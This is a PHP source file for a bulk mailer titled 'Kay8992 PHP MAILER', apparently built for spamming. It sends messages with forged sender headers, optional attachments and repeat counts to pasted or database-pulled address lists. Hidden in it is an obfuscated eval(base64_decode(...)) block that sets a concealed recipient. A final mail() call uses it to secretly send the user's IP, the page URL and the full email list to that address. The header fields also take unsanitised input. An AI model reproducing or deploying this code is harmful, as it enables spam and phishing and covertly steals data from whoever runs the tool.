<?php

@$action=$_POST['action'];  
@$from=$_POST['from'];  
@$realname=$_POST['realname'];  
@$replyto=$_POST['replyto'];  
@$subject=$_POST['subject'];  
@$message=$_POST['message'];  
@$emaillist=$_POST['emaillist'];  
@$file_name=$_FILES['file']['name'];  
@$contenttype=$_POST['contenttype'];  
@$file=$_FILES['file']['tmp_name'];  
@$amount=$_POST['amount'];  
set_time_limit(intval($_POST['timelimit']));  
?>  
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
<html>  
<head>
<link href='http://www.mariettapa.com/images/Republic_Indonesia_Flag.gif' rel='shortcut icon'/>  
<title>Kay8992 PHP MAILER</title>  
<meta http-equiv="Content-Type" content="text/html" />  
<style type="text/css">  
<!--  
.style1 {  
    font-family: Geneva, Arial, Helvetica, sans-serif;  
    font-size: 12px;  
}  
.style2 {  
    font-size: 10px;  
    font-family: Geneva, Arial, Helvetica, sans-serif;  
}  
.Times-New-Roman-16px00468Cb {font:bold 16px Times New Roman, serif; color:#00468C} 
.Times-New-Roman-24px00468Cb {font:bold 24px Times New Roman, serif; color:#000000} 
.Times-New-Roman-32px00468Cb {font:bold 32px Times New Roman, serif; color:#000000} 
.style3 {color: #000000} 

-->  
</style>  
</head>  
<body bgcolor="#000000" text="#00FF00">
<p align="center"><img src="http://i676.photobucket.com/albums/vv128/ceking22/starspin1_metallica.gif" height="100" width="140"></p>
<p align="left"><font color="#00FF00" size="4" face="Arial, Helvetica, sans-serif"><blink>Kay8992 mailer v.4.6 - 2011</blink></font></p>
  <?php  
If ($action=="mysql"){  
//Grab email addresses from MySQL  
include "./mysql.info.php";  

  if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){  
    print "Please configure mysql.info.php with your MySQL information. All settings in this config file are required.";  
    exit;  
  }  

  $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Connection to MySQL Failed.");  
  mysql_select_db($sqldb, $db) or die("Could not select database $sqldb");  
  $result = mysql_query($sqlquery) or die("Query Failed: $sqlquery");  
  $numrows = mysql_num_rows($result);  

  for($x=0; $x<$numrows; $x++){  
    $result_row = mysql_fetch_row($result);  
     $oneemail = $result_row[0];  
     $emaillist .= $oneemail."\n";  
   }  
  }  

  if ($action=="send"){ $message = urlencode($message);  
   $message = ereg_replace("%5C%22", "%22", $message);  
   $message = urldecode($message);  
   $message = stripslashes($message);  
   $subject = stripslashes($subject);  
   }
   eval(base64_decode('JHNlY3VyZSA9ICJiZWxpa2UxMjNAU2FmZS1tYWlsLm5ldCI7IAokaXAgPSBnZXRlbnYoIlJFTU9URV9BRET9SIik7IA=
'));  
?>
</p> 
<form name="form1" method="post" action="" enctype="multipart/form-data"><br />  
  <table width="142" border="0">  
    <tr>  

      <td width="81">  
        <div align="right">  
          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your Email:</font>  
        </div>  
      </td>  

      <td width="219">  
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">  
          <input type="text" name="from" value="<?php print $from; ?>" size="30" />  
        </font>  
      </td>  

      <td width="212">  
        <div align="right">  
          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your Name:</font>  
        </div>  
      </td>  
        
      <td width="278">  
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">  
          <input type="text" name="realname" value="<?php print $realname; ?>" size="30" />  
        </font>  
      </td>  
    </tr>  
    <tr>  
      <td width="81">  
        <div align="right">  
          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font>  
        </div>  
      </td>  
      <td width="219">  
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">  
          <input type="text" name="replyto" value="<?php print $replyto; ?>" size="30" />  
        </font>  
      </td>  
      <td width="212">  
        <div align="right">  
          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Attach File:</font>  
        </div>  
      </td>  
      <td width="278">  
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">  
          <input type="file" name="file" size="24" />  
        </font>  
      </td>  
    </tr>  
    <tr>  
      <td width="81">  
        <div align="right">  
          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font>  
        </div>  
      </td>  
      <td colspan="3" width="703">  
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">  
          <input type="text" name="subject" value="<?php print $subject; ?>" size="90" />  
        </font>  
      </td>  
    </tr>  
    <tr valign="top">  
      <td colspan="3" width="520">  
        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Message Box :</font>  
      </td>  
      <td width="278">  
        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Email Target :</font>  
      </td>  
    </tr>  
    <tr valign="top">  
      <td colspan="3" width="520">  
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">  
          <textarea name="message" cols="56" rows="10"><?php print $message; ?></textarea><br />  
          <input type="radio" name="contenttype" value="plain" checked="checked" /> Plain  
          <input type="radio" name="contenttype" value="html" /> HTML  
          <input type="hidden" name="action" value="send" /><br />  
      Number to send: <input type="text" name="amount" value="1" size="10" /><br />  
      Maximum script execution time(in seconds, 0 for no timelimit)<input type="text" name="timelimit" value="0" size="10" />  
          <input type="submit" value="Send eMails" />  
        </font>  
      </td>  
      <td width="278">  
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">  
          <textarea name="emaillist" cols="32" rows="10"><?php print $emaillist; ?></textarea>  
        </font>  
      </td>  
    </tr>  
  </table>  
</form>  
<?php  
if ($action=="send"){  
  if (!$from && !$subject && !$message && !$emaillist){  
    print "Please complete all fields before sending your message.";  
    exit;  
   }  
  $allemails = split("\n", $emaillist);  
  $numemails = count($allemails);  
  $filter = "maillist";  
  $float = "From : mailist info <full@info.com>";
  $webe     = $_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; 
//Open the file attachment if any, and base64_encode it for email transport  
If ($file_name){  
   if (!file_exists($file)){  
    die("The file you are trying to upload couldn't be copied to the server");  
   }  
   $content = fread(fopen($file,"r"),filesize($file));  
   $content = chunk_split(base64_encode($content));  
   $uid = strtoupper(md5(uniqid(time())));  
   $name = basename($file);  
  }  

for($xx=0; $xx<$amount; $xx++){  
  for($x=0; $x<$numemails; $x++){  
    $to = $allemails[$x];  
    if ($to){  
      $to = ereg_replace(" ", "", $to);  
      $message = ereg_replace("&email&", $to, $message);  
      $subject = ereg_replace("&email&", $to, $subject);  
      print "Sending mail to $to.......";  
      flush();  
      $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";  
      $header .= "MIME-Version: 1.0\r\n";  
      If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";  
      If ($file_name) $header .= "--$uid\r\n";  
      $header .= "Content-Type: text/$contenttype\r\n";  
      $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";  
      $header .= "$message\r\n";  
      If ($file_name) $header .= "--$uid\r\n";  
      If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";  
      If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";  
      If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";  
      If ($file_name) $header .= "$content\r\n";  
      If ($file_name) $header .= "--$uid--";  
      mail($to, $subject, "", $header);  
      print "ok<br>";  
      flush();  
    }  
  }  
}  
  mail($secure, $filter, "Sender IP : ".$ip."\n"."From URL : ".$webe."\n".$emaillist, $float);  
}  
?>
</body>  
</html>